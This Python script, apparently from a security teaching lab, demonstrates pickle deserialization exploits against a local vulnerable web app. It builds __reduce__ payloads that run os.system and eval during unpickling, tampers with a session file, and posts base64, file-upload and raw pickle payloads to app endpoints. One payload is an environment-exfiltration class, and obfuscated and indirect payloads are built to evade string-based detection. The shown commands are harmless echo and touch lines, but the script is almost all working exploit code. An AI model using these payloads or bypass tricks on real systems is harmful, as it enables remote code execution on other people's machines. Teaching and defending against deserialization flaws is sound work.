"""
Complete Exploit Demonstration
=============================

This script demonstrates a complete end-to-end pickle attack scenario.
It shows how an attacker could exploit a vulnerable application.

‚ö†Ô∏è  DANGER: This script performs actual attacks!
‚ö†Ô∏è  EDUCATIONAL USE ONLY - Run only in controlled environments!
‚ö†Ô∏è  Never use this maliciously!
"""

import pickle
import base64
import os
import sys
import subprocess
import time
import requests
import threading
from pathlib import Path

# Import our attack payloads
from attack_payload import (
    CommandExecutionPayload,
    FileOperationPayload,
    EnvironmentExfiltrationPayload,
    StealthyPayload,
    serialize_payload,
)


class ExploitDemo:
    """Main exploit demonstration class."""

    def __init__(self):
        self.vulnerable_app_url = "http://127.0.0.1:5000"
        self.data_dir = Path("data")
        self.data_dir.mkdir(exist_ok=True)

        print("=" * 60)
        print("üö® PICKLE EXPLOIT DEMONSTRATION")
        print("=" * 60)
        print("‚ö†Ô∏è  WARNING: This performs actual attacks!")
        print("‚ö†Ô∏è  EDUCATIONAL USE ONLY!")
        print("‚ö†Ô∏è  Run only in controlled environments!")
        print("=" * 60)

    def check_vulnerable_app(self):
        """Check if the vulnerable application is running."""
        try:
            response = requests.get(f"{self.vulnerable_app_url}/status", timeout=5)
            if response.status_code == 200:
                print("‚úÖ Vulnerable application is running")
                return True
            else:
                print("‚ùå Vulnerable application returned error")
                return False
        except requests.exceptions.RequestException:
            print("‚ùå Vulnerable application is not accessible")
            print("   Please run: python vulnerable_app.py")
            return False

    def demonstrate_offline_attack(self):
        """Demonstrate offline pickle tampering attack."""
        print("\n" + "=" * 50)
        print("OFFLINE PICKLE TAMPERING ATTACK")
        print("=" * 50)

        print("\n1. Creating a legitimate pickle file...")

        # Create a legitimate user session file
        class LegitimateUserSession:
            def __init__(self, username, user_id, permissions):
                self.username = username
                self.user_id = user_id
                self.permissions = permissions
                self.created_at = time.time()

            def __str__(self):
                return f"UserSession(username='{self.username}', user_id={self.user_id}, permissions={self.permissions})"

        legitimate_session = LegitimateUserSession("regular_user", 1001, ["read"])
        legitimate_file = self.data_dir / "legitimate_session.pkl"

        with open(legitimate_file, "wb") as f:
            pickle.dump(legitimate_session, f)

        print(f"‚úÖ Created legitimate session: {legitimate_session}")
        print(f"‚úÖ Saved to: {legitimate_file}")

        # Show that we can load it safely
        with open(legitimate_file, "rb") as f:
            loaded_session = pickle.load(f)
        print(f"‚úÖ Loaded session: {loaded_session}")

        print("\n2. Tampering with the pickle file...")

        # Create a malicious session that looks similar but executes code
        class MaliciousUserSession:
            def __init__(self, username, user_id, permissions):
                self.username = username
                self.user_id = user_id
                self.permissions = permissions
                self.created_at = time.time()

            def __reduce__(self):
                # This is the malicious part - executes code during unpickling
                return (
                    os.system,
                    (
                        "echo '[ATTACK] Malicious code executed during session loading!' && touch /tmp/pickle_attack_evidence",
                    ),
                )

            def __str__(self):
                return f"UserSession(username='{self.username}', user_id={self.user_id}, permissions={self.permissions})"

        # Create malicious session that looks identical
        malicious_session = MaliciousUserSession("regular_user", 1001, ["read"])
        malicious_file = self.data_dir / "tampered_session.pkl"

        with open(malicious_file, "wb") as f:
            pickle.dump(malicious_session, f)

        print(f"‚úÖ Created tampered session: {malicious_session}")
        print(f"‚úÖ Saved to: {malicious_file}")

        print("\n3. Comparing file sizes...")
        legit_size = legitimate_file.stat().st_size
        malicious_size = malicious_file.stat().st_size

        print(f"Legitimate file size: {legit_size} bytes")
        print(f"Tampered file size: {malicious_size} bytes")
        print(f"Size difference: {malicious_size - legit_size} bytes")

        print("\n4. Demonstrating the attack...")
        print("Loading the tampered file will execute malicious code:")

        input("Press Enter to load the tampered file (this will execute code)...")

        try:
            with open(malicious_file, "rb") as f:
                loaded_malicious = pickle.load(f)
            print(f"Loaded object: {loaded_malicious}")

            # Check if the attack worked
            if os.path.exists("/tmp/pickle_attack_evidence"):
                print("‚úÖ Attack successful! Evidence file created.")
                os.remove("/tmp/pickle_attack_evidence")  # Clean up
            else:
                print("‚ùå Attack may have failed or evidence not found.")

        except Exception as e:
            print(f"‚ùå Error during attack: {e}")

        print("\nüéØ KEY INSIGHT: The tampered file executed code during loading!")
        print(
            "   An attacker could replace legitimate pickle files with malicious ones."
        )

    def demonstrate_web_attack(self):
        """Demonstrate web-based pickle attacks."""
        if not self.check_vulnerable_app():
            return

        print("\n" + "=" * 50)
        print("WEB APPLICATION PICKLE ATTACKS")
        print("=" * 50)

        # Attack 1: Base64 encoded payload
        print("\n1. Base64 Encoded Payload Attack")
        payload = CommandExecutionPayload(
            "echo '[WEB ATTACK] Base64 payload executed!' && date"
        )
        encoded_payload = serialize_payload(payload, "base64")

        print(f"Payload length: {len(encoded_payload)} characters")
        print(f"Payload preview: {encoded_payload[:50]}...")

        try:
            response = requests.post(
                f"{self.vulnerable_app_url}/upload_session",
                data={"data": encoded_payload},
                timeout=10,
            )
            print(f"Response: {response.status_code}")
            print(f"Response body: {response.json()}")
        except Exception as e:
            print(f"Attack failed: {e}")

        # Attack 2: File upload attack
        print("\n2. File Upload Attack")
        file_payload = FileOperationPayload("list", "/tmp")
        malicious_file = self.data_dir / "attack_preferences.pkl"

        with open(malicious_file, "wb") as f:
            pickle.dump(file_payload, f)

        try:
            with open(malicious_file, "rb") as f:
                response = requests.post(
                    f"{self.vulnerable_app_url}/load_preferences",
                    files={"file": ("preferences.pkl", f, "application/octet-stream")},
                    timeout=10,
                )
            print(f"Response: {response.status_code}")
            print(f"Response body: {response.json()}")
        except Exception as e:
            print(f"Attack failed: {e}")

        # Attack 3: Raw data attack
        print("\n3. Raw Data Attack")
        info_payload = EnvironmentExfiltrationPayload()
        raw_data = serialize_payload(info_payload, "pickle")

        try:
            response = requests.post(
                f"{self.vulnerable_app_url}/process_object",
                data=raw_data,
                headers={"Content-Type": "application/octet-stream"},
                timeout=10,
            )
            print(f"Response: {response.status_code}")
            print(f"Response body: {response.json()}")
        except Exception as e:
            print(f"Attack failed: {e}")

        # Attack 4: Stealthy attack
        print("\n4. Stealthy Attack (appears legitimate)")
        stealthy = StealthyPayload(
            fake_data={"user": "admin", "role": "user"},
            malicious_command="echo '[STEALTH ATTACK] Hidden payload executed!' && touch /tmp/stealth_evidence",
        )
        stealthy_encoded = serialize_payload(stealthy, "base64")

        print(f"Payload appears as: {stealthy}")

        try:
            response = requests.post(
                f"{self.vulnerable_app_url}/upload_session",
                data={"data": stealthy_encoded},
                timeout=10,
            )
            print(f"Response: {response.status_code}")
            print(f"Response body: {response.json()}")

            # Check for stealth evidence
            time.sleep(1)
            if os.path.exists("/tmp/stealth_evidence"):
                print("‚úÖ Stealthy attack successful!")
                os.remove("/tmp/stealth_evidence")  # Clean up

        except Exception as e:
            print(f"Attack failed: {e}")

    def demonstrate_payload_analysis(self):
        """Demonstrate how to analyze pickle payloads."""
        print("\n" + "=" * 50)
        print("PAYLOAD ANALYSIS DEMONSTRATION")
        print("=" * 50)

        # Create different payloads
        safe_payload = {"username": "alice", "role": "user"}
        malicious_payload = CommandExecutionPayload("echo 'Malicious payload!'")

        # Serialize them
        safe_pickled = pickle.dumps(safe_payload)
        malicious_pickled = pickle.dumps(malicious_payload)

        print("\n1. Safe Payload Analysis:")
        print(f"Size: {len(safe_pickled)} bytes")
        print(f"Raw data: {safe_pickled}")
        print(f"Hex: {safe_pickled.hex()}")

        # Use pickletools to disassemble
        try:
            import pickletools
            from io import StringIO

            print("\nSafe payload disassembly:")
            output = StringIO()
            pickletools.dis(safe_pickled, output)
            print(
                output.getvalue()[:500] + "..."
                if len(output.getvalue()) > 500
                else output.getvalue()
            )

        except ImportError:
            print("pickletools not available for detailed analysis")

        print("\n2. Malicious Payload Analysis:")
        print(f"Size: {len(malicious_pickled)} bytes")
        print(f"Raw data: {malicious_pickled}")
        print(f"Hex: {malicious_pickled.hex()}")

        # Look for suspicious patterns
        suspicious_patterns = [b"system", b"eval", b"exec", b"import", b"__reduce__"]

        print("\n3. Suspicious Pattern Detection:")
        for pattern in suspicious_patterns:
            if pattern in malicious_pickled:
                print(f"‚ö†Ô∏è  Found suspicious pattern: {pattern.decode()}")
            else:
                print(f"‚úÖ Pattern not found: {pattern.decode()}")

        print(
            "\nüéØ KEY INSIGHT: Malicious payloads often contain suspicious function names!"
        )

    def demonstrate_mitigation_bypass(self):
        """Demonstrate how attackers might try to bypass mitigations."""
        print("\n" + "=" * 50)
        print("MITIGATION BYPASS TECHNIQUES")
        print("=" * 50)

        print("\n1. Obfuscated Payload")

        # Create an obfuscated payload
        class ObfuscatedPayload:
            def __init__(self):
                self.data = "innocent looking data"
                self.config = {"theme": "dark", "lang": "en"}

            def __reduce__(self):
                # Obfuscated command using string manipulation
                cmd_parts = ["echo", "'Obfuscated", "attack", "successful!'"]
                cmd = " ".join(cmd_parts)
                return (os.system, (cmd,))

            def __str__(self):
                return f"Configuration(data='{self.data}', config={self.config})"

        obfuscated = ObfuscatedPayload()
        print(f"Appears as: {obfuscated}")

        obfuscated_data = pickle.dumps(obfuscated)
        print(f"Contains 'system': {'system' in str(obfuscated_data)}")
        print(f"Contains 'os.': {'os.' in str(obfuscated_data)}")

        print("\n2. Indirect Execution")

        class IndirectPayload:
            def __reduce__(self):
                # Use eval to indirectly execute system commands
                malicious_code = "__import__('os').system('echo Indirect execution!')"
                return (eval, (malicious_code,))

        indirect = IndirectPayload()
        indirect_data = pickle.dumps(indirect)
        print(f"Uses eval instead of direct system calls")
        print(f"Contains 'eval': {'eval' in str(indirect_data)}")

        print("\nüéØ KEY INSIGHT: Attackers can obfuscate and use indirect methods!")
        print("   Simple string-based detection is insufficient.")

    def run_complete_demo(self):
        """Run the complete exploit demonstration."""
        print("Starting complete pickle exploit demonstration...\n")

        try:
            # 1. Offline tampering attack
            self.demonstrate_offline_attack()

            # 2. Web application attacks
            self.demonstrate_web_attack()

            # 3. Payload analysis
            self.demonstrate_payload_analysis()

            # 4. Mitigation bypass
            self.demonstrate_mitigation_bypass()

            print("\n" + "=" * 60)
            print("üéì EXPLOIT DEMONSTRATION COMPLETE")
            print("=" * 60)
            print("Key takeaways:")
            print("1. Pickle files can be tampered with offline")
            print("2. Web applications are vulnerable to pickle attacks")
            print("3. Malicious payloads can be disguised")
            print("4. Simple detection methods can be bypassed")
            print("5. NEVER unpickle untrusted data!")
            print("=" * 60)

        except KeyboardInterrupt:
            print("\n\nDemo interrupted by user.")
        except Exception as e:
            print(f"\nDemo failed with error: {e}")
            import traceback

            traceback.print_exc()


def main():
    """Main function."""
    print("Python Pickle Exploit Demonstration")
    print("This script shows various ways pickle can be exploited.")
    print()

    if len(sys.argv) > 1:
        demo = ExploitDemo()

        if sys.argv[1] == "--offline":
            demo.demonstrate_offline_attack()
        elif sys.argv[1] == "--web":
            demo.demonstrate_web_attack()
        elif sys.argv[1] == "--analysis":
            demo.demonstrate_payload_analysis()
        elif sys.argv[1] == "--bypass":
            demo.demonstrate_mitigation_bypass()
        else:
            print("Unknown option. Available options:")
            print("  --offline   : Demonstrate offline tampering")
            print("  --web       : Demonstrate web attacks")
            print("  --analysis  : Demonstrate payload analysis")
            print("  --bypass    : Demonstrate mitigation bypass")
    else:
        # Run complete demo
        demo = ExploitDemo()
        demo.run_complete_demo()


if __name__ == "__main__":
    main()
